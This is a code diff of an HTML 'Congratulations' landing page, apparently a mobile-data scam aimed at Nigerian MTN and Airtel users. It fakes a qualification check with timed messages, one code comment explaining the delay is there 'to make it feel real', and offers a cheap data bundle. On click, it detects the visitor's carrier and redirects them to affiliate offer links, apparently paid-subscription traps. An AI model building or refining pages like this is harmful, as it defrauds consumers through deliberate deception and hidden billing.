@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Congratulation</title>
 
-<!-- Meta Pixel Code -->
+  <!-- Meta Pixel Code -->
 <script>
 !function(f,b,e,v,n,t,s)
 {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -49,8 +49,10 @@ src="https://www.facebook.com/tr?id=1622898892221727&ev=PageView&noscript=1"
 
 <body class="min-h-screen flex items-center justify-center px-4">
 
+<!-- SUBTLE DIM BACKGROUND (ONLY ADDITION) -->
 <div class="fixed inset-0 bg-black/10 pointer-events-none"></div>
 
+<!-- PROCESSING / CHECKING -->
 <div id="processBox" class="relative z-10 soft-card rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
   <h1 id="processText" class="text-xl font-extrabold text-blue-600 mb-6">
     Processing… Please wait
@@ -61,6 +63,7 @@ src="https://www.facebook.com/tr?id=1622898892221727&ev=PageView&noscript=1"
   </p>
 </div>
 
+<!-- CONGRATULATIONS -->
 <div id="congratsBox" class="relative z-10 hidden soft-card rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
   <h1 class="text-2xl font-extrabold text-green-600 mb-2">
     🎉 Congratulations!
@@ -71,94 +74,82 @@ src="https://www.facebook.com/tr?id=1622898892221727&ev=PageView&noscript=1"
   </p>
 
   <div id="bundleText" class="text-3xl font-black text-blue-600 mb-2">
-    10GB DATA
+    5GB DATA
   </div>
 
-  <div id="priceText" class="mb-6">
+  <div id="priceText" class="inline-block bg-green-100 text-green-700 font-bold px-4 py-2 rounded-full mb-6">
     ₦100 ONLY
   </div>
 
   <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 text-sm text-left mb-6">
-    <p>To Receive Data - Confirm your number and Subscribe to any of our service on the next page to receive data.</p>
+    <p>• Click the button below</p>
+    <p>• Enter your phone number</p>
+    <p>• Subscribe to receive data</p>
   </div>
 
   <button class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl shadow-lg transition">
-    Subscribe Here to Receive Data
+    Subscribe to Receive Data
   </button>
 </div>
 
 <script>
   const params = new URLSearchParams(window.location.search);
-  const bundle = params.get("bundle") || "10GB";
+  const bundle = params.get("bundle") || "5GB";
+  const price = params.get("price") || "100";
 
+  // After 4 seconds → Checking
   setTimeout(() => {
     document.getElementById("processText").innerText =
       "Checking if you qualified…";
   }, 4000);
 
+  // After 10 seconds → Show congratulations
   setTimeout(() => {
     document.getElementById("processBox").classList.add("hidden");
     document.getElementById("congratsBox").classList.remove("hidden");
 
     document.getElementById("bundleText").innerText =
       bundle + " DATA";
-
-    const priceBox = document.getElementById("priceText");
-
-    if (bundle === "20GB") {
-      priceBox.innerHTML = `
-        <div class="text-gray-400 line-through text-lg">₦200</div>
-        <div class="bg-green-100 text-green-700 px-4 py-2 rounded-full font-bold mt-1 inline-block">
-          ₦100 ONLY
-        </div>
-      `;
-    } 
-    else if (bundle === "15GB") {
-      priceBox.innerHTML = `
-        <div class="text-gray-400 line-through text-lg">₦150</div>
-        <div class="bg-green-100 text-green-700 px-4 py-2 rounded-full font-bold mt-1 inline-block">
-          ₦100 ONLY
-        </div>
-      `;
-    } 
-    else {
-      priceBox.innerHTML = `
-        <div class="bg-green-100 text-green-700 px-4 py-2 rounded-full font-bold inline-block">
-          ₦100 ONLY
-        </div>
-      `;
-    }
-
-  }, 15000);
+    document.getElementById("priceText").innerText =
+      "₦" + price + " ONLY";
+  }, 5000);
 </script>
 
+<!-- NETWORK DETECTION SCRIPT (Fully Integrated, No Edits to Existing HTML) -->
 <script>
 function detectNetwork() {
   fetch("https://ipinfo.io/json?token=55355b912bdc12")
     .then(res => res.json())
     .then(data => {
       const network = data.org ? data.org.toLowerCase() : "";
+      console.log("Detected network:", network);
 
       if (network.includes("mtn")) {
-        window.location.href = "https://covwyxqac.one/cl/67a9642f26918e02";
+        window.location.href = "https://www.mouseflyby.work/click?offer_id=35625&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE";
       } else if (network.includes("airtel")) {
-        window.location.href = "https://covwyxqac.one/cl/67a9642f26918e02";
+        window.location.href = "https://qkzpkdm.com/cl/653475ff4f6c6361";
       } else {
-        window.location.href = "https://covwyxqac.one/cl/67a9642f26918e02";
+        window.location.href = "https://qkzpkdm.com/cl/67a9642f26918e02";
       }
     })
     .catch(() => {
-      window.location.href = "https://covwyxqac.one/cl/67a9642f26918e02";
+      window.location.href = "https://qkzpkdm.com/cl/67a9642f26918e02";
     });
 }
 
+// Add spinning icon to button on click
 document.addEventListener("DOMContentLoaded", function() {
   const btn = document.querySelector('#congratsBox button');
   if (!btn) return;
 
   btn.addEventListener('click', function() {
+    // Disable button
     btn.disabled = true;
 
+    // Save original content
+    const originalContent = btn.innerHTML;
+
+    // Replace with spinner only
     btn.innerHTML = `
       <svg class="animate-spin inline-block w-5 h-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
         <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
@@ -166,6 +157,7 @@ document.addEventListener("DOMContentLoaded", function() {
       </svg>
     `;
 
+    // Delay to make it feel real
     setTimeout(() => {
       detectNetwork();
     }, 2000);
